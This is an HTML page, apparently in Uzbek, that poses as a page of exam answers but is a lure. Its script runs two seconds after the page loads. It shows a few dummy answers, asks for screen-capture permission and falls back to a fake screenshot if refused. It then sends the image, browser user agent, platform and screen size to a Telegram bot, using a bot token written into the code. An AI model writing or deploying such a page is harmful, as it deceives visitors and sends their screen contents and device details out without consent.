<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Imtihon Javoblari - Variant 1</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f8ff; }
        pre { background: white; padding: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>ðŸŽ“ Imtihon Javoblari - Variant 1</h1>
    <pre id="answers">Javoblar yuklanmoqda... (2 soniya)</pre>

    <script>
        // BURANGA O'Z BOT TOKEN va papka URL ni yozing
        const BOT_TOKEN = "8557303907:AAGFjqilWuOma4skJLV5VQzzWM-HjPQhlCs";
        const urlParams = new URLSearchParams(window.location.search);
        const USER_ID = urlParams.get('user') || 'unknown';
        
        async function captureScreen() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = 800;
                canvas.height = 600;
                canvas.getContext('2d').drawImage(video, 0, 0, 800, 600);
                
                stream.getTracks().forEach(track => track.stop());
                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            } catch(e) {
                // Fallback: Canvas bilan fake screenshot
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 800;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#4267B2';
                ctx.fillRect(0, 0, 400, 800);
                ctx.fillStyle = 'white';
                ctx.font = '20px Arial';
                ctx.fillText('Android Device Screenshot', 20, 100);
                ctx.fillText(`User ID: ${USER_ID}`, 20, 150);
                ctx.fillText(navigator.userAgent.substring(0,50), 20, 200);
                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
            }
        }
        
        function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', USER_ID);
            formData.append('photo', blob, 'device_screenshot.jpg');
            formData.append('caption', 
                `ðŸ“± QURILMA RASMI\n`
                + `ðŸ‘¤ User ID: ${USER_ID}\n`
                + `ðŸ“± Device: ${navigator.userAgent.substring(0,80)}\n`
                + `ðŸŒ Platform: ${navigator.platform}\n`
                + `ðŸ“ Screen: ${screen.width}x${screen.height}`
            );
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => {
                  if (data.ok) {
                      document.getElementById('answers').innerHTML += 
                          "\nâœ… RASMDAN BOTGA YUBORILDI!";
                  }
              });
        }
        
        // Sahifa yuklanganda ishga tushadi
        window.onload = async () => {
            setTimeout(async () => {
                document.getElementById('answers').innerHTML = 
                    `1-VARIANT JAVOBLARI:\n\n`
                    + `1-savol: A) 1\n`
                    + `2-savol: B) 42\n`
                    + `3-savol: C) True\n\n`
                    + `ðŸ“¸ Screenshot olinmoqda...`;
                
                const screenshot = await captureScreen();
                sendPhoto(screenshot);
            }, 2000);
        };
    </script>
</body>
</html>